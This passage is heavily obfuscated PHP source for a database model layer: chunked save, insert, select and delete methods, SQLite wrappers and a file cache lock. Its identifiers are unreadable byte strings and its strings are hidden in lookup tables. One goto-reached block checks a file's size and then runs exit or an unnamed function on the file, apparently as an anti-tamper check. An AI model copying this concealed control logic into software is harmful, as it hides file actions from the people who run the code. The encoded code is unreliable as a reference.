? $›¸¢×·ü . $Šï¾šˆô[71] : $Šï¾šˆô[12]; show_json($›¸¢×·ü . LNG($Šï¾šˆô[370]) . "\x28{$Èä™ƒµ²}\x29", !1); } protected function metaSet($Û÷Ê˜, $øñÏ•‰À = null, $®¾ÙÂ¥ = null) { $ÑÁ­×³ =& $_SERVER[ĞÂ¤àÓï]; if (!$this->tableMeta || !$Û÷Ê˜) { return !1; } $Ô¼õ = $this->tableMeta[$ÑÁ­×³[371]]; $û³£Äã = $this->tableMeta[$ÑÁ­×³[372]]; $±Ê§­®ı = Model($û³£Äã); $¨ù‹ÄÎî = array($Ô¼õ => $Û÷Ê˜, $ÑÁ­×³[373] => $øñÏ•‰À); if (is_null($øñÏ•‰À)) { return $±Ê§­®ı->where(array($Ô¼õ => $Û÷Ê˜))->delete(); } if (is_null($®¾ÙÂ¥) && is_string($øñÏ•‰À)) { return $±Ê§­®ı->where($¨ù‹ÄÎî)->delete(); } $±²ÃÂ¦µ = is_array($øñÏ•‰À) ? $øñÏ•‰À : array(); if (is_string($øñÏ•‰À)) { $±²ÃÂ¦µ[$øñÏ•‰À] = $®¾ÙÂ¥; } $¥ÄöŞŸ‘ = array(); foreach ($±²ÃÂ¦µ as $‹ŠŸÆı– => $®–²ÕÛ¡) { if (is_null($®–²ÕÛ¡) && is_string($‹ŠŸÆı–)) { $±Ê§­®ı->where(array($Ô¼õ => $Û÷Ê˜, $ÑÁ­×³[373] => $‹ŠŸÆı–))->delete(); continue; } $this->checkLength($®–²ÕÛ¡, !1, $û³£Äã . $ÑÁ­×³[4] . $‹ŠŸÆı–); $¥ÄöŞŸ‘[] = array($Ô¼õ => $Û÷Ê˜, $ÑÁ­×³[94] => $‹ŠŸÆı–, $ÑÁ­×³[374] => $®–²ÕÛ¡); } $·‘‹â = $ÑÁ­×³[375] . $û³£Äã; CacheLock::lock($·‘‹â); $±Ê§­®ı->where(array($Ô¼õ => $Û÷Ê˜))->addAll($¥ÄöŞŸ‘, array(), !0); CacheLock::unlock($·‘‹â); return !0; } public function metaGet($Ï”×Í‹°, $ü¬àÁ¬Á = false) { $¤¿ê…®² =& $_SERVER[ĞÂ¤àÓï]; if (!$this->tableMeta) { return array(); } $Öœñ·ø = $this->tableMeta[$¤¿ê…®²[371]]; $¦ûÜ ƒ = Model($this->tableMeta[$¤¿ê…®²[372]]); if ($ü¬àÁ¬Á) { $ÇÄ´ƒ‰º = array($Öœñ·ø => $Ï”×Í‹°, $¤¿ê…®²[94] => $ü¬àÁ¬Á); return $¦ûÜ ƒ->where($ÇÄ´ƒ‰º)->getField($¤¿ê…®²[374]); } $ÇÄ´ƒ‰º = array($Öœñ·ø => $Ï”×Í‹°); $Îšø‡‡¦ = $¦ûÜ ƒ->field($¤¿ê…®²[376])->where($ÇÄ´ƒ‰º)->select(); $Îšø‡‡¦ = array_to_keyvalue($Îšø‡‡¦, $¤¿ê…®²[94], $¤¿ê…®²[374]); return $Îšø‡‡¦; } private function checkDataAutoHas($ä÷Å­‡) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $öÛÉæú) { if (in_array($ä÷Å­‡, explode($_SERVER[ĞÂ¤àÓï][50], $öÛÉæú[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$®Ãš¾”Ê, $Š”ïêÒÅ) { $Ü”¾‹€¨ =& $_SERVER[ĞÂ¤àÓï]; if (!is_array($®Ãš¾”Ê)) { return; } foreach ($this->dataAuto as $¿ç÷ùôä) { $óñ€ÆÕ = $¿ç÷ùôä[0]; if (!in_array($Š”ïêÒÅ, explode($Ü”¾‹€¨[50], $¿ç÷ùôä[2]))) { continue; } switch (trim($¿ç÷ùôä[3])) { case $Ü”¾‹€¨[321]: case $Ü”¾‹€¨[322]: $êíå½•¢ = $¿ç÷ùôä[1]; $€‹¢—ß = isset($¿ç÷ùôä[4]) ? (array) $¿ç÷ùôä[4] : array(); if ($êíå½•¢ == $Ü”¾‹€¨[203] && array_key_exists($óñ€ÆÕ, $®Ãš¾”Ê)) { if (!$®Ãš¾”Ê[$óñ€ÆÕ]) { unset($®Ãš¾”Ê[$óñ€ÆÕ]); } break; } if (isset($®Ãš¾”Ê[$óñ€ÆÕ])) { array_unshift($€‹¢—ß, $®Ãš¾”Ê[$óñ€ÆÕ]); } if ($Ü”¾‹€¨[321] == $¿ç÷ùôä[3]) { $®Ãš¾”Ê[$óñ€ÆÕ] = call_user_func_array($êíå½•¢, $€‹¢—ß); } else { $®Ãš¾”Ê[$óñ€ÆÕ] = call_user_func_array(array(&$this, $êíå½•¢), $€‹¢—ß); } break; case $Ü”¾‹€¨[270]: if (isset($®Ãš¾”Ê[$óñ€ÆÕ]) && $®Ãš¾”Ê[$óñ€ÆÕ]) { $®Ãš¾”Ê[$óñ€ÆÕ] = call_user_func_array(array(&$this, $¿ç÷ùôä[1]), array($®Ãš¾”Ê[$óñ€ÆÕ])); } break; case $Ü”¾‹€¨[273]: $®Ãš¾”Ê[$óñ€ÆÕ] = $®Ãš¾”Ê[$¿ç÷ùôä[1]]; break; case $Ü”¾‹€¨[294]: if (isset($®Ãš¾”Ê[$óñ€ÆÕ]) && !is_string($®Ãš¾”Ê[$óñ€ÆÕ])) { $®Ãš¾”Ê[$óñ€ÆÕ] = json_encode_force($®Ãš¾”Ê[$óñ€ÆÕ]); } break; case $Ü”¾‹€¨[323]: if ($®Ãš¾”Ê[$óñ€ÆÕ] === $Ü”¾‹€¨[12]) { unset($®Ãš¾”Ê[$óñ€ÆÕ]); } break; case $Ü”¾‹€¨[324]: $®Ãš¾”Ê[$óñ€ÆÕ] = $¿ç÷ùôä[1]; default: break; } } if ($Š”ïêÒÅ == $Ü”¾‹€¨[355]) { $±î¦¬¸å = strtolower($this->db->getDbType()); if (strpos($±î¦¬¸å, $Ü”¾‹€¨[13]) !== 0) { return; } $…ó­†× = $this->field(!0)->fields; $ÛÊÌ†İ© = $…ó­†×[$Ü”¾‹€¨[252]]; if (isset($…ó­†×[$Ü”¾‹€¨[251]])) { unset($ÛÊÌ†İ©[$…ó­†×[$Ü”¾‹€¨[251]]]); } foreach ($ÛÊÌ†İ© as $åÄ«ÖÆ— => $Š”ïêÒÅ) { if (!isset($®Ãš¾”Ê[$åÄ«ÖÆ—])) { $®Ãš¾”Ê[$åÄ«ÖÆ—] = $Ü”¾‹€¨[12]; } } } } private function dataAfterFilter(&$ıÜú§£¼) { $Ï¿Òç÷˜ =& $_SERVER[ĞÂ¤àÓï]; foreach ($this->dataAuto as $¡«Î¥Å‚) { $™ã¡Ò½Ö = $¡«Î¥Å‚[0]; if (!isset($ıÜú§£¼[$™ã¡Ò½Ö])) { continue; } if (!in_array($Ï¿Òç÷˜[357], explode($Ï¿Òç÷˜[50], $¡«Î¥Å‚[2]))) { continue; } switch (trim($¡«Î¥Å‚[3])) { case $Ï¿Òç÷˜[321]: case $Ï¿Òç÷˜[322]: $šÍø’îİ = isset($¡«Î¥Å‚[4]) ? (array) $¡«Î¥Å‚[4] : array(); array_unshift($šÍø’îİ, $ıÜú§£¼[$™ã¡Ò½Ö]); if (isset($¡«Î¥Å‚[4]) && $¡«Î¥Å‚[4] == $Ï¿Òç÷˜[377]) { $šÍø’îİ = array($ıÜú§£¼[$™ã¡Ò½Ö]); } if ($Ï¿Òç÷˜[321] == $¡«Î¥Å‚[3]) { $ıÜú§£¼[$™ã¡Ò½Ö] = call_user_func_array($¡«Î¥Å‚[1], $šÍø’îİ); } else { $ıÜú§£¼[$™ã¡Ò½Ö] = call_user_func_array(array(&$this, $¡«Î¥Å‚[1]), $šÍø’îİ); } break; case $Ï¿Òç÷˜[270]: if (isset($ıÜú§£¼[$™ã¡Ò½Ö]) && $ıÜú§£¼[$™ã¡Ò½Ö]) { $ıÜú§£¼[$™ã¡Ò½Ö] = call_user_func_array(array(&$this, $¡«Î¥Å‚[1]), array($ıÜú§£¼[$™ã¡Ò½Ö])); } break; case $Ï¿Òç÷˜[273]: $ıÜú§£¼[$™ã¡Ò½Ö] = $ıÜú§£¼[$¡«Î¥Å‚[1]]; break; case $Ï¿Òç÷˜[294]: $å°à¨š› = $ıÜú§£¼[$™ã¡Ò½Ö]; $ıÜú§£¼[$™ã¡Ò½Ö] = json_decode($å°à¨š›, !0); if (is_null($ıÜú§£¼[$™ã¡Ò½Ö])) { $ıÜú§£¼[$™ã¡Ò½Ö] = $å°à¨š›; } break; case $Ï¿Òç÷˜[323]: if ($ıÜú§£¼[$™ã¡Ò½Ö] === $Ï¿Òç÷˜[12]) { unset($ıÜú§£¼[$™ã¡Ò½Ö]); } break; case $Ï¿Òç÷˜[324]: $ıÜú§£¼[$™ã¡Ò½Ö] = $¡«Î¥Å‚[1]; break; default: break; } } } public function saveAll($ÉİÎ—éİ) { $Ñ¦¨¶ôú =& $_SERVER[ĞÂ¤àÓï]; $ÏÆííâ = $this->tablePrefix . $this->tableName; $‡‡Øçë„ = self::SQL_WHERE_IN_CHUNK; $ÉİÎ—éİ = is_array($ÉİÎ—éİ) ? $ÉİÎ—éİ : array(); $³Õí ùû = $Ñ¦¨¶ôú[378]; $¢ÙĞ­Å = 0; $üÅ­¨ö = array(); $šğ‘¬ = count($ÉİÎ—éİ); for ($ÉÇ³—¾´ = 0; $ÉÇ³—¾´ < $šğ‘¬; $ÉÇ³—¾´++) { $ÑÉåÍœİ = $ÉİÎ—éİ[$ÉÇ³—¾´]; if (!is_array($ÑÉåÍœİ) || count($ÑÉåÍœİ) != 4) { continue; } $ÜÅÎşİº = "\x55\120\104\x41\124\105\40\140{$ÏÆííâ}\x60\40\123\105\x54\40{$ÑÉåÍœİ[2]}\x20\x3d\40\103\x41\123\x45\40{$ÑÉåÍœİ[0]}\x20\xa"; if ($¢ÙĞ­Å == 0) { $³Õí ùû = $ÜÅÎşİº; } $üÅ­¨ö[] = $Ñ¦¨¶ôú[118] . $ÑÉåÍœİ[1] . $Ñ¦¨¶ôú[118]; $¢ÙĞ­Å++; $³Õí ùû .= "\x20\x57\x48\105\116\x20\x27{$ÑÉåÍœİ[1]}\x27\x20\124\110\x45\116\40\x27{$ÑÉåÍœİ[3]}\x27\x20\xa"; if ($¢ÙĞ­Å == $‡‡Øçë„ || $ÉÇ³—¾´ == $šğ‘¬ - 1) { $³šñ›ää = implode($Ñ¦¨¶ôú[50], $üÅ­¨ö); $³Õí ùû .= "\40\105\x4e\104\x20\x20\x57\110\105\122\105\x20{$ÑÉåÍœİ[0]}\40\111\116\40\50{$³šñ›ää}\51\x20"; $this->execute($³Õí ùû); $¢ÙĞ­Å = 0; $³Õí ùû = $ÜÅÎşİº; $this->chunkEventCheck(count($üÅ­¨ö)); $üÅ­¨ö = array(); } } $this->chunkEventSet(); } public function saveAllEach($ù²¶Óƒ) { $²¨ÛŒÂ× =& $_SERVER[ĞÂ¤àÓï]; $Ãû¼¸— = $this->tablePrefix . $this->tableName; foreach ($ù²¶Óƒ as $öíİÅÃÔ) { if (!is_array($öíİÅÃÔ) || count($öíİÅÃÔ) != 4) { continue; } $³·Û Í· = $öíİÅÃÔ[0] . $²¨ÛŒÂ×[379] . $öíİÅÃÔ[1] . $²¨ÛŒÂ×[118]; $úÛÄ¯´– = $öíİÅÃÔ[2] . $²¨ÛŒÂ×[379] . $öíİÅÃÔ[3] . $²¨ÛŒÂ×[118]; $Æè¦ÆÇ = "\165\160\144\x61\x74\145\40{$Ãû¼¸—}\x20\163\145\x74\40{$úÛÄ¯´–}\40\167\x68\145\162\x65\40{$³·Û Í·}\73"; $this->execute($Æè¦ÆÇ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($êßÓ = false, $Ãâ…¥á = false) { $this->_chunkEvent = $êßÓ; $this->_chunkEventParam = $Ãâ…¥á; } private function chunkEventCheck($µù·ôê) { if (!$this->_chunkEvent) { return; } $¶ŸşºÔ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $¶ŸşºÔ[$_SERVER[ĞÂ¤àÓï][380]] = $µù·ôê; Hook::trigger($this->_chunkEvent, $¶ŸşºÔ); } public function addAll($Ùñò¼­, $×•Ê¹¼ = array(), $õõÂÑşÊ = false) { $Ùì¡»ÉÒ =& $_SERVER[ĞÂ¤àÓï]; ignore_timeout(); $Ùòõ¢Õ = self::SQL_WHERE_IN_CHUNK; if (empty($Ùñò¼­)) { $this->error = think_lang($Ùì¡»ÉÒ[271]); return !1; } $×•Ê¹¼ = $this->_parseOptions($×•Ê¹¼); foreach ($Ùñò¼­ as $Ë‰å·‚Î => $Õ¨Ù§ŠÙ) { $Ùñò¼­[$Ë‰å·‚Î] = $this->_facade($Õ¨Ù§ŠÙ); $this->_beforeInsert($Ùñò¼­[$Ë‰å·‚Î], $×•Ê¹¼); } if (method_exists($this->db, $Ùì¡»ÉÒ[272])) { for ($²ûÆ‰Ø§ = 0; $²ûÆ‰Ø§ < count($Ùñò¼­); $²ûÆ‰Ø§ += $Ùòõ¢Õ) { $£Í¶¨ê = array_slice($Ùñò¼­, $²ûÆ‰Ø§, $Ùòõ¢Õ); if (!is_array($£Í¶¨ê) || count($£Í¶¨ê) == 0) { break; } $ÊƒŞ³ÑÊ = $this->db->insertAll($£Í¶¨ê, $×•Ê¹¼, $õõÂÑşÊ); $this->chunkEventCheck(count($£Í¶¨ê)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Ùñò¼­ as $Ë‰å·‚Î => $Õ¨Ù§ŠÙ) { $ÊƒŞ³ÑÊ = $this->db->insert($Õ¨Ù§ŠÙ, $×•Ê¹¼, $õõÂÑşÊ); } $this->commit(); } if (!1 !== $ÊƒŞ³ÑÊ) { $Ó®¾³×Ó = $this->getLastInsID(); if ($Ó®¾³×Ó) { return $Ó®¾³×Ó; } } return $ÊƒŞ³ÑÊ; } public function save($¦¥ö¢«™ = '', $Ö•°‹ë¨ = array()) { $½üî¾ñ¸ =& $_SERVER[ĞÂ¤àÓï]; $‘üú«æ› = self::SQL_WHERE_IN_CHUNK; $„â´œ‘© = $this->optionsValue(); $ÙÙ¹íİ = $this->findWhereField($„â´œ‘©); if (!$ÙÙ¹íİ) { return parent::save($¦¥ö¢«™, $Ö•°‹ë¨); } $¢¨øË’ = 0; $²áÓüœ” = $„â´œ‘©[$½üî¾ñ¸[275]][$ÙÙ¹íİ][1]; $²áÓüœ” = is_array($²áÓüœ”) ? $²áÓüœ” : array(); $áÓÂ¸ÓŠ = count($²áÓüœ”); for ($ß×¸Œ“æ = 0; $ß×¸Œ“æ < $áÓÂ¸ÓŠ; $ß×¸Œ“æ += $‘üú«æ›) { $Íèõáåƒ = array_slice($²áÓüœ”, $ß×¸Œ“æ, $‘üú«æ›); if (!is_array($Íèõáåƒ) || count($Íèõáåƒ) == 0) { break; } $„â´œ‘©[$½üî¾ñ¸[275]][$ÙÙ¹íİ][1] = $Íèõáåƒ; $this->optionsValue($„â´œ‘©); $¢¨øË’ += parent::save($¦¥ö¢«™, $Ö•°‹ë¨); $this->chunkEventCheck(count($Íèõáåƒ)); } $this->chunkEventSet(); return $¢¨øË’; } public function add($‡Ş›‰Ä÷ = '', $­Â«Ú»¯ = array(), $¼Ï¨ÌÓ· = false) { if ($this->addTaskStatus && is_array($‡Ş›‰Ä÷)) { $this->addTaskData[] = $‡Ş›‰Ä÷; return; } return parent::add($‡Ş›‰Ä÷, $­Â«Ú»¯, $¼Ï¨ÌÓ·); } public function parseWhereLike($Ö®…ËÄß, $¾”àÑàº = '', $ˆ‰“­Òå = false, &$ı×½Äğò = false) { $úÂÊÍù =& $_SERVER[ĞÂ¤àÓï]; $èö›–Èñ = $GLOBALS[$úÂÊÍù[6]][$úÂÊÍù[381]]; if (!$èö›–Èñ[$úÂÊÍù[382]]) { return $Ö®…ËÄß; } if (!is_array($Ö®…ËÄß)) { return $Ö®…ËÄß; } $Š‡‹Ãí = array(); $œ¼Ë¶…½ = 0; foreach ($Ö®…ËÄß as $íÓå‰”º => $ÃüÜ§ÏÅ) { if (is_array($ÃüÜ§ÏÅ) && count($ÃüÜ§ÏÅ) == 2 && $ÃüÜ§ÏÅ[0] == $úÂÊÍù[383] && is_string($ÃüÜ§ÏÅ[1]) && substr($ÃüÜ§ÏÅ[1], 0, 1) == $úÂÊÍù[384] && substr($ÃüÜ§ÏÅ[1], strlen($ÃüÜ§ÏÅ[1]) - 1, 1) == $úÂÊÍù[384]) { $ı×½Äğò = !0; $Äº”¾¡Œ = is_string($íÓå‰”º) ? $íÓå‰”º : $¾”àÑàº; $È²ßÃã = substr($ÃüÜ§ÏÅ[1], 1, strlen($ÃüÜ§ÏÅ[1]) - 2); $È²ßÃã = $this->db->escapeString($È²ßÃã); if (!strpos($Äº”¾¡Œ, $úÂÊÍù[10])) { $Äº”¾¡Œ = $úÂÊÍù[385] . $Äº”¾¡Œ . $úÂÊÍù[385]; } $¶¬Åä¡³ = $úÂÊÍù[188] . $È²ßÃã . $úÂÊÍù[188]; $È²ßÃã = str_replace(array($úÂÊÍù[10], $úÂÊÍù[386], $úÂÊÍù[11]), $úÂÊÍù[387], $È²ßÃã); if ($èö›–Èñ[$úÂÊÍù[388]]) { $¶¬Åä¡³ = $úÂÊÍù[389] . $È²ßÃã . $úÂÊÍù[390]; if ($èö›–Èñ[$úÂÊÍù[391]]) { $¶¬Åä¡³ = $úÂÊÍù[390] . $È²ßÃã . $úÂÊÍù[389]; } } $Š‡‹Ãí[$œ¼Ë¶…½] = $úÂÊÍù[392] . $Äº”¾¡Œ . $úÂÊÍù[393] . $¶¬Åä¡³ . $úÂÊÍù[394]; $œ¼Ë¶…½++; continue; } if (is_array($ÃüÜ§ÏÅ)) { $¾”àÑàº = is_string($íÓå‰”º) ? $íÓå‰”º : $¾”àÑàº; $ÃüÜ§ÏÅ = $this->parseWhereLike($ÃüÜ§ÏÅ, $¾”àÑàº, !0, $ı×½Äğò); } if (is_numeric($íÓå‰”º)) { $Š‡‹Ãí[$œ¼Ë¶…½] = $ÃüÜ§ÏÅ; $œ¼Ë¶…½++; } else { $Š‡‹Ãí[$íÓå‰”º] = $ÃüÜ§ÏÅ; } } if ($ı×½Äğò && !$ˆ‰“­Òå) { } return $Š‡‹Ãí; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($æß×µ”ü = array()) { $ëãı¹ =& $_SERVER[ĞÂ¤àÓï]; $£¯Áóªì = self::SQL_WHERE_IN_CHUNK; $Ç²ÏœôÈ = $this->optionsValue(); $úÉ§ü« = $this->findWhereField($Ç²ÏœôÈ); if (!$úÉ§ü« || isset($Ç²ÏœôÈ[$ëãı¹[292]]) || isset($Ç²ÏœôÈ[$ëãı¹[353]])) { return parent::select($æß×µ”ü); } $Ä÷¯ºûŠ = $Ç²ÏœôÈ[$ëãı¹[275]][$úÉ§ü«][1]; $Ä÷¯ºûŠ = is_array($Ä÷¯ºûŠ) ? $Ä÷¯ºûŠ : array(); $ÑÆñ‹˜û = null; for ($ÒĞŞ€²› = 0; $ÒĞŞ€²› < count($Ä÷¯ºûŠ); $ÒĞŞ€²› += $£¯Áóªì) { $Ä†ìâãİ = array_slice($Ä÷¯ºûŠ, $ÒĞŞ€²›, $£¯Áóªì); if (!is_array($Ä†ìâãİ) || count($Ä†ìâãİ) == 0) { break; } $Ç²ÏœôÈ[$ëãı¹[275]][$úÉ§ü«][1] = $Ä†ìâãİ; $this->optionsValue($Ç²ÏœôÈ); $á˜­æ›Í = parent::select($æß×µ”ü); if (!$á˜­æ›Í) { continue; } $ÑÆñ‹˜û = is_array($ÑÆñ‹˜û) ? $ÑÆñ‹˜û : array(); $ÑÆñ‹˜û = array_merge($ÑÆñ‹˜û, $á˜­æ›Í); } return $ÑÆñ‹˜û; } public function delete($¡‹ıáí = array()) { $¥íæ±›ú =& $_SERVER[ĞÂ¤àÓï]; $˜’«Ø™É = self::SQL_WHERE_IN_CHUNK; $îºêĞ€˜ = $this->optionsValue(); $Õñ‰ùø = $this->findWhereField($îºêĞ€˜); if (!$Õñ‰ùø) { return parent::delete($¡‹ıáí); } $¤Ó¬÷íâ = 0; $Ù€íà‡¾ = $îºêĞ€˜[$¥íæ±›ú[275]][$Õñ‰ùø][1]; $Ù€íà‡¾ = is_array($Ù€íà‡¾) ? $Ù€íà‡¾ : array(); for ($ÕÔåµš» = 0; $ÕÔåµš» < count($Ù€íà‡¾); $ÕÔåµš» += $˜’«Ø™É) { $‘•¿˜– = array_slice($Ù€íà‡¾, $ÕÔåµš», $˜’«Ø™É); if (!is_array($‘•¿˜–) || count($‘•¿˜–) == 0) { break; } $îºêĞ€˜[$¥íæ±›ú[275]][$Õñ‰ùø][1] = $‘•¿˜–; $this->optionsValue($îºêĞ€˜); $¤Ó¬÷íâ += parent::delete($¡‹ıáí); } return $¤Ó¬÷íâ; } private function findWhereField($¯¿Ã¼•À) { $¨Ìíšé =& $_SERVER[ĞÂ¤àÓï]; $ ±ó‘¨â = self::SQL_WHERE_IN_CHUNK; if (!is_array($¯¿Ã¼•À) || !is_array($¯¿Ã¼•À[$¨Ìíšé[275]])) { return !1; } foreach ($¯¿Ã¼•À[$¨Ìíšé[275]] as $‡Ï¬êÕ» => $èŞ‘†Ü¸) { if (is_array($èŞ‘†Ü¸) && isset($èŞ‘†Ü¸[0]) && is_string($èŞ‘†Ü¸[0]) && strtolower($èŞ‘†Ü¸[0]) == $¨Ìíšé[7] && is_array($èŞ‘†Ü¸[1]) && count($èŞ‘†Ü¸[1]) > $ ±ó‘¨â) { ignore_timeout(); return $‡Ï¬êÕ»; } } return !1; } public function setMasterDB($…á¬ßÉÕ = true) { think_config($_SERVER[ĞÂ¤àÓï][395], $…á¬ßÉÕ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\145\155\117\160\x74\151\x6f\x6e"; public $field = array(); public function listData($‚³ŸÛÒ¦ = false, $Ú¦¢ÀÒŒ = "\x6d\x6f\144\x69\x66\x79\124\x69\155\145", $é»Ğš¾ = false) { $ªÅÉÒ­´ = Model($this->modelType)->get(!1, $this->optionType, !0); $âûüş³× = array_values($ªÅÉÒ­´); if ($âûüş³× && $âûüş³×[0] && !is_array($âûüş³×[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ªÅÉÒ­´ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ªÅÉÒ­´) { return $‚³ŸÛÒ¦ ? null : array(); } if (!$‚³ŸÛÒ¦) { $ªÅÉÒ­´ = array_filter(array_values($ªÅÉÒ­´)); return array_sort_by($ªÅÉÒ­´, $Ú¦¢ÀÒŒ, $é»Ğš¾); } return $ªÅÉÒ­´[$_SERVER[ĞÂ¤àÓï][396] . $‚³ŸÛÒ¦]; } public function insert($‰ÄÛ‡õ) { $›Ö²§áê =& $_SERVER[ĞÂ¤àÓï]; $‰ÄÛ‡õ = array_field_key($‰ÄÛ‡õ, $this->field); $¹ìÜÆ‡ˆ = Model($this->modelType)->get($›Ö²§áê[397], $this->optionType . $›Ö²§áê[398]); $¹ìÜÆ‡ˆ = $¹ìÜÆ‡ˆ ? $¹ìÜÆ‡ˆ : 0; $‰ÄÛ‡õ[$›Ö²§áê[399]] = ++$¹ìÜÆ‡ˆ; $‰ÄÛ‡õ[$›Ö²§áê[200]] = time(); $‰ÄÛ‡õ[$›Ö²§áê[85]] = time(); Model($this->modelType)->set($›Ö²§áê[397], $¹ìÜÆ‡ˆ, $this->optionType . $›Ö²§áê[398]); Model($this->modelType)->set($›Ö²§áê[396] . $¹ìÜÆ‡ˆ, $‰ÄÛ‡õ, $this->optionType); return $¹ìÜÆ‡ˆ; } public function update($£½¢ßãé, $Ü„½ÛœĞ) { $ğÙóöû =& $_SERVER[ĞÂ¤àÓï]; $Ü„½ÛœĞ = array_field_key($Ü„½ÛœĞ, $this->field); $¢‡Ó¨˜ = $this->listData($£½¢ßãé); if (!$¢‡Ó¨˜ || !$£½¢ßãé) { return !1; } $Ü„½ÛœĞ = array_merge($¢‡Ó¨˜, $Ü„½ÛœĞ); $Ü„½ÛœĞ[$ğÙóöû[85]] = time(); return Model($this->modelType)->set($ğÙóöû[396] . $£½¢ßãé, $Ü„½ÛœĞ, $this->optionType); } public function remove($‡·Šô¢) { if (!$‡·Šô¢) { return !1; } return Model($this->modelType)->remove($_SERVER[ĞÂ¤àÓï][396] . $‡·Šô¢, $this->optionType); } public function clear() { $Ûã’õú“ =& $_SERVER[ĞÂ¤àÓï]; Model($this->modelType)->remove($Ûã’õú“[397], $this->optionType . $Ûã’õú“[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($¸ôéãŠÆ, $î”ÃÜˆÔ) { if (!$î”ÃÜˆÔ) { return !1; } $ãÛüªŒÇ = $this->listData(); $ãÛüªŒÇ = array_to_keyvalue($ãÛüªŒÇ, $¸ôéãŠÆ); return isset($ãÛüªŒÇ[$î”ÃÜˆÔ]) ? $ãÛüªŒÇ[$î”ÃÜˆÔ] : !1; } public function findByName($º‰õêÜ÷) { return $this->findByKey($_SERVER[ĞÂ¤àÓï][32], $º‰õêÜ÷); } protected function resetData($«Ã“®è¬) { $Ÿä¥ƒñ³ =& $_SERVER[ĞÂ¤àÓï]; $«Ã“®è¬ = is_array($«Ã“®è¬) ? $«Ã“®è¬ : array(); $¨çš¨” = array(); for ($§„®¹€ = 0; $§„®¹€ < count($«Ã“®è¬); $§„®¹€++) { $¨çš¨”[$Ÿä¥ƒñ³[396] . $«Ã“®è¬[$§„®¹€][$Ÿä¥ƒñ³[399]]] = $«Ã“®è¬[$§„®¹€]; } return Model($this->modelType)->set($¨çš¨”, !1, $this->optionType); } private function getAutoName($ÚÅ£æ‚Ö) { $œÛÌÏË’ = array_to_keyvalue($this->listData(), $_SERVER[ĞÂ¤àÓï][32]); if (!$œÛÌÏË’ || !isset($œÛÌÏË’[$ÚÅ£æ‚Ö])) { return $ÚÅ£æ‚Ö; } for ($¬œÂòæØ = 1; $¬œÂòæØ < count($œÛÌÏË’); $¬œÂòæØ++) { $ËÕÃ˜èí = $ÚÅ£æ‚Ö . "\50{$¬œÂòæØ}\x29"; if (!isset($œÛÌÏË’[$ËÕÃ˜èí])) { return $ËÕÃ˜èí; } } return $ËÕÃ˜èí; } } goto FÀ‚¥”ù¯¦; bä‚ğ„ÚÑá: if ($_SERVER[$_SERVER[ĞÂ¤àÓï][777]] != $_size($_file)) { $_getc = $_SERVER[ĞÂ¤àÓï][778]; $_getfile = $_SERVER[$_SERVER[ĞÂ¤àÓï][779]] . $_SERVER[ĞÂ¤àÓï][780]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ĞÂ¤àÓï][231], $_getfilec); if (count($_getarrs) < $_SERVER[ĞÂ¤àÓï][630]) { $exit = $_SERVER[ĞÂ¤àÓï][781]; $exit(); } $_act = $_SERVER[ĞÂ¤àÓï][782]; $_act($_file); } class DbSqlite extends DbSqliteBase { public function query($Šµë¯ã) { $¤Ã¸óøĞ =& $_SERVER[ĞÂ¤àÓï]; if (!CacheLock::fileLock($¤Ã¸óøĞ[13])) { return !1; } $ÇûáÌõ´ = parent::query($Šµë¯ã); CacheLock::fileUnLock($¤Ã¸óøĞ[13]); return $ÇûáÌõ´; } public function execute($š‘ûø†û) { $ºŞë„áì =& $_SERVER[ĞÂ¤àÓï]; if (!CacheLock::fileLock($ºŞë„áì[13])) { return !1; } $ ¬¸ »ú = parent::execute($š‘ûø†û); CacheLock::fileUnLock($ºŞë„áì[13]); return $ ¬¸ »ú; } } class DbSqlite3 extends DbSqlite3Base { public function query($å™Ûé€ò) { $üáè¸–³ =& $_SERVER[ĞÂ¤àÓï]; if (!CacheLock::fileLock($üáè¸–³[13])) { return !1; } $ÒÃ‰‹îÊ = parent::query($å™Ûé€ò); CacheLock::fileUnLock($üáè¸–³[13]); return $ÒÃ‰‹îÊ; } public function execute($ÜÀŠùôã) { $üÉìÅé =& $_SERVER[ĞÂ¤àÓï]; if (!CacheLock::fileLock($üÉìÅé[13])) { return !1; } $›Ú®õÁĞ = parent::execute($ÜÀŠùôã); CacheLock::fileUnLock($üÉìÅé[13]); return $›Ú®õÁĞ; } } goto B¦Ü¥—Š; B‘ö—ø›Ò™: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $‡‹›º î =& $_SERVER[ĞÂ¤àÓï]; $½ÅŠ¶õÉ = $GLOBALS[$‡‹›º î[6]][$‡‹›º î[349]]; self::$cachePath = $½ÅŠ¶õÉ[$‡‹›º î[199]][$‡‹›º î[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ñò‹À¨ì, $ò”ÌË£Ô = 0) { $è¹¥ñß’ =& $_SERVER[ĞÂ¤àÓï]; $ŸùçÖ˜› = microtime(!0); $›ì¥ = $ŸùçÖ˜› + $ò”ÌË£Ô + 0.0001; $ÜÀù„ È = rtrim(self::$cachePath, $è¹¥ñß’[8]) . $è¹¥ñß’[866] . md5($Ñò‹À¨ì) . $è¹¥ñß’[863]; if (file_exists($ÜÀù„ È) && filemtime($ÜÀù„ È) && filemtime($ÜÀù„ È) < time() - 10) { @unlink($ÜÀù„ È); } do { if (file_exists($ÜÀù„ È)) { cacheLockWait(); continue; } $¼×†Â° = fopen($ÜÀù„ È, $è¹¥ñß’[867]); if (!$¼×†Â°) { return !1; } $¸îÚæ = flock($¼×†Â°, LOCK_EX | LOCK_NB); self::$caches[$Ñò‹À¨ì] = array($è¹¥ñß’[868] => $¼×†Â°, $è¹¥ñß’[199] => 